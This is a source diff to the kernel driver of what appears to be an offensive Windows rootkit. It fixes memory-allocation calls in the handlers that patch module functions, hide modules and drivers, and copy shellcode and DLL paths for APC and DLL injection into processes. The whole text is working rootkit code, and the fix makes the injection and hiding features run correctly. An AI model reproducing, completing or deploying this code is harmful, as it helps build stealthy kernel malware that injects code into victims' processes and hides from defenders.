@@ -728,20 +728,20 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		patchedModule.PatchLength = data->PatchLength;
 
 		SIZE_T strSize = strlen(data->FunctionName);
-		MemoryAllocator<CHAR*> functionNameAllocator(patchedModule.FunctionName, strSize, PagedPool);
+		MemoryAllocator<CHAR*> functionNameAllocator(&patchedModule.FunctionName, strSize, PagedPool);
 		status = functionNameAllocator.CopyData(data->FunctionName, strSize);
 
 		if (!NT_SUCCESS(status))
 			break;
 
 		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
-		MemoryAllocator<WCHAR*> moduleNameAllocator(patchedModule.ModuleName, strSize, PagedPool);
+		MemoryAllocator<WCHAR*> moduleNameAllocator(&patchedModule.ModuleName, strSize, PagedPool);
 		status = moduleNameAllocator.CopyData(data->ModuleName, strSize);
 
 		if (!NT_SUCCESS(status))
 			break;
 
-		MemoryAllocator<PVOID> patchAllocator(patchedModule.Patch, data->PatchLength, PagedPool);
+		MemoryAllocator<PVOID> patchAllocator(&patchedModule.Patch, data->PatchLength, PagedPool);
 		status = patchAllocator.CopyData(data->Patch, data->PatchLength);
 
 		if (!NT_SUCCESS(status))
@@ -787,7 +787,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		auto data = (HiddenModuleInformation*)Irp->AssociatedIrp.SystemBuffer;
 		hiddenModule.Pid = data->Pid;
 		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
-		MemoryAllocator<WCHAR*> moduleNameAllocator(hiddenModule.ModuleName, moduleNameSize, PagedPool);
+		MemoryAllocator<WCHAR*> moduleNameAllocator(&hiddenModule.ModuleName, moduleNameSize, PagedPool);
 		status = moduleNameAllocator.CopyData(data->ModuleName, moduleNameSize);
 
 		if (!NT_SUCCESS(status))
@@ -826,7 +826,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		auto data = (HiddenDriverInformation*)Irp->AssociatedIrp.SystemBuffer;
 		hiddenDriver.Hide = data->Hide;
 		SIZE_T driverNameSize = wcslen(data->DriverName) * sizeof(WCHAR);
-		MemoryAllocator<WCHAR*> driverNameAllocator(hiddenDriver.DriverName, driverNameSize, PagedPool);
+		MemoryAllocator<WCHAR*> driverNameAllocator(&hiddenDriver.DriverName, driverNameSize, PagedPool);
 		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);
 
 		if (!NT_SUCCESS(status)) {
@@ -891,7 +891,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		shellcodeInfo.Parameter2Size = data->Parameter2Size;
 		shellcodeInfo.Parameter3 = NULL;
 		shellcodeInfo.Parameter3Size = data->Parameter3Size;
-		MemoryAllocator<PVOID> shellcodeAllocator(shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize, PagedPool);
+		MemoryAllocator<PVOID> shellcodeAllocator(&shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize, PagedPool);
 		status = shellcodeAllocator.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);
 
 		if (!NT_SUCCESS(status))
@@ -899,28 +899,28 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		// Copy parameters
 		if (shellcodeInfo.Parameter1Size > 0) {
-			MemoryAllocator<PVOID> parameter1Alloc(shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size, PagedPool);
+			MemoryAllocator<PVOID> parameter1Alloc(&shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size, PagedPool);
 			status = parameter1Alloc.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
-		}
 
-		if (!NT_SUCCESS(status))
-			break;
+			if (!NT_SUCCESS(status))
+				break;
+		}
 
 		if (shellcodeInfo.Parameter2Size > 0) {
-			MemoryAllocator<PVOID> parameter2Alloc(shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size, PagedPool);
+			MemoryAllocator<PVOID> parameter2Alloc(&shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size, PagedPool);
 			status = parameter2Alloc.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
-		}
 
-		if (!NT_SUCCESS(status))
-			break;
+			if (!NT_SUCCESS(status))
+				break;
+		}
 
 		if (shellcodeInfo.Parameter3Size > 0) {
-			MemoryAllocator<PVOID> parameter3Alloc(shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size, PagedPool);
+			MemoryAllocator<PVOID> parameter3Alloc(&shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size, PagedPool);
 			status = parameter3Alloc.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
-		}
 
-		if (!NT_SUCCESS(status))
-			break;
+			if (!NT_SUCCESS(status))
+				break;
+		}
 
 		switch (shellcodeInfo.Type) {
 			case APCInjection: {
@@ -976,7 +976,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		MemoryAllocator<CHAR*> dllPathAllocator(dllInfo.DllPath, dllPathSize + 1, PagedPool);
+		MemoryAllocator<CHAR*> dllPathAllocator(&dllInfo.DllPath, dllPathSize + 1, PagedPool);
 		status = dllPathAllocator.CopyData(data->DllPath, dllPathSize);
 
 		if (!NT_SUCCESS(status))
